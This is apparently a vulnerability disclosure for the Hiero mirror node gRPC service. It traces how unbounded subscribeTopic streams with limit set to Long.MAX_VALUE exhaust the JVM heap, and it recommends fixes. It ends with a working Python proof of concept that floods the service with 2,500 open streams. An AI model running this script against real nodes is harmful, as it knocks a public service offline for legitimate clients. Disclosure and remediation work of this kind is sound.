### Title
Unbounded Concurrent Subscriptions via Unauthenticated `subscribeTopic` Leads to JVM Heap Exhaustion (DoS)

### Summary
The `subscribeTopic()` endpoint in `ConsensusController` accepts a `ConsensusTopicQuery` with `limit=Long.MAX_VALUE` from any unauthenticated caller, creating a reactive stream that runs indefinitely. Because there is no cap on total concurrent subscriptions and no Netty-level connection limit, an attacker opening many TCP connections (each with up to 5 streams) can accumulate thousands of heap-resident `TopicContext` objects and reactive pipeline chains, exhausting the JVM heap and crashing the gRPC service.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` — `grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java`, lines 43–53 — accepts the raw `ConsensusTopicQuery`, calls `toFilter()` (line 56), and passes the result directly to `topicMessageService::subscribeTopic` with no upper-bound check on `limit`.

`TopicMessageFilter.limit` — `grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java`, lines 25–26 — carries only `@Min(0)`. There is no `@Max` constraint, so `Long.MAX_VALUE` (= 9,223,372,036,854,775,807) passes validation.

`TopicMessageFilter.hasLimit()` — line 39–41 — returns `limit > 0`. With `limit=Long.MAX_VALUE`, `hasLimit()` is `true`, so `TopicMessageServiceImpl` applies `flux.take(Long.MAX_VALUE)` (line 84). Project Reactor's `take(n)` with `n = Long.MAX_VALUE` is functionally unbounded; the stream never self-terminates.

`TopicMessageServiceImpl.subscribeTopic()` — `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 59–92 — allocates a `TopicContext` per subscription (line 61) containing `AtomicLong count`, `AtomicReference<TopicMessage> last`, a `Stopwatch`, and a copy of the `TopicMessageFilter`. When no `endTime` is set, `pastEndTime()` (line 123–131) returns `Flux.never()`, so the stream is permanently open. The `subscriberCount` gauge (line 48) is purely observational — it is never checked to reject new subscriptions.

`GrpcConfiguration` — `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 31–34 — configures the Netty server with only `maxConcurrentCallsPerConnection(5)`. No `maxConnections`, `maxConnectionAge`, or `maxConnectionIdle` is set, leaving the total number of simultaneous TCP connections unbounded.

**Root cause:** The `limit` field has no upper-bound validation, `hasLimit()` treats `Long.MAX_VALUE` as a finite limit (creating an effectively infinite `take()`), there is no global subscriber cap, and the Netty server has no total-connection limit.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (no authentication required, no IP-based connection limit).
2. On each connection, attacker sends 5 concurrent `subscribeTopic` RPCs (the per-connection maximum) with `limit=Long.MAX_VALUE`, a valid `topicID`, no `consensusEndTime`, and `consensusStartTime` set to epoch 0.
3. Each RPC allocates a `TopicContext` + full reactive pipeline chain on the heap and registers a live listener. The stream never terminates.
4. With N=1000 connections × 5 streams = 5,000 open subscriptions, heap consumption from `TopicContext` objects, reactive operator chains, `Disposable` references, and listener registrations accumulates.
5. The JVM heap (default limit: 2048 Mi per `charts/hedera-mirror-grpc/values.yaml`) is exhausted, triggering `OutOfMemoryError` and crashing the pod.

**Why existing checks fail:**
- `@Min(0)` on `limit`: rejects negatives only; `Long.MAX_VALUE` is accepted.
- `maxConcurrentCallsPerConnection=5`: limits streams per TCP connection, not total TCP connections.
- `retriever.timeout=60s`: applies only to the historical-retrieval phase; live streams (post-historical) have no idle timeout.
- GCP `maxRatePerEndpoint=250`: rate-limits new connection attempts per second but does not cap total concurrent open connections.
- `subscriberCount` AtomicLong: metric only, never used as a gate.

### Impact Explanation
A successful attack crashes the gRPC service pod entirely (JVM `OutOfMemoryError`). All in-flight HCS topic subscriptions are dropped. Kubernetes will restart the pod, but the attacker can immediately reconnect and repeat, keeping the service in a crash-restart loop. This constitutes a total denial of the HCS gRPC API — legitimate clients cannot confirm new transactions or receive topic messages for the duration of the attack.

### Likelihood Explanation
No authentication or API key is required. The gRPC port (5600) is publicly reachable. The attack requires only a standard gRPC client library and the ability to open many TCP connections, which is trivially achievable from a single machine or a small botnet. The exploit is deterministic and repeatable: each restart of the pod can be immediately followed by a new wave of connections. The attacker does not need any knowledge of valid topic IDs beyond what is publicly observable on-chain.

### Recommendation
1. **Add `@Max` to `TopicMessageFilter.limit`** — enforce a reasonable ceiling (e.g., `@Max(10_000)` or a configurable property). Treat `limit=0` as the only "indefinite" sentinel, consistent with the proto spec.
2. **Enforce a global concurrent-subscriber cap** — check `subscriberCount` before accepting a new subscription and return `RESOURCE_EXHAUSTED` when the cap is reached.
3. **Configure Netty connection limits** — add `serverBuilder.maxConnectionAge(...)`, `serverBuilder.maxConnectionIdle(...)`, and a total `maxConnections` in `GrpcConfiguration`.
4. **Add per-IP connection rate limiting** — use a gRPC `ServerInterceptor` or an infrastructure-level policy to limit connections per source IP.
5. **Set a stream idle timeout** — terminate live streams that have not emitted a message within a configurable window (e.g., 5 minutes), not just the historical-retrieval phase.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
TOPIC_NUM = 1234  # any valid topic number
NUM_CONNECTIONS = 500
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        limit=(2**63 - 1),  # Long.MAX_VALUE — passes @Min(0), hasLimit()=true
        # no consensusEndTime → pastEndTime() returns Flux.never()
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        it = stub.subscribeTopic(query)
        streams.append(it)
    # Hold streams open indefinitely
    import time; time.sleep(3600)

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 500 * 5 = 2500 open reactive streams on the server,
# each holding a TopicContext + pipeline in heap → OOM crash.
```